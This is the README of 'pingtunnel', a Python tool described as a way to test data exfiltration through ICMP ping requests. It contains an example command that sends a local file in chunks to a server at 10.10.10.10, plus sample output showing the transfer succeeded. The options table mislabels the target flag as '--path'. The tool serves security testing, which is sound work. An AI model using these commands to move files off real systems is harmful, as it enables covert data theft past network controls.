# Description

Test possible data exfiltration through ping requests

# Installation

`pip install pingtunnel`

# Usage

**From command line:**

`python -m pingtunnel --path PATH --target TARGET`

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
|--path | -p | String | - | Path to file to be exfiltrated |
|--path | -p | String | - | IP of exfiltration server |


# Example

`python -m pingtunnel -p ./example.jpg -t 10.10.10.10`

- Make sure to use `tcpdump` or `wireshark` on the exfiltration server in
order to capture the ping requests

```
################################################################################

pingtunnel by 5f0
Test possible data exfiltration through ping requests

Current working directory: path/to/pingtunnel

Datetime: 01/01/1970 10:11:12

################################################################################

Status
---
    Exfiltration Server: 10.10.10.10
 File to be exfiltrated: ./example.jpg

  Total Number of Bytes: 1094
Number of Ping Requests: 35.0


Execution
---
-> Split ./example.jpg in 35.0 chunks
-> Send chunks


--> Transmission successful!

################################################################################

Execution Time: 0.014563 sec
```

# License

MIT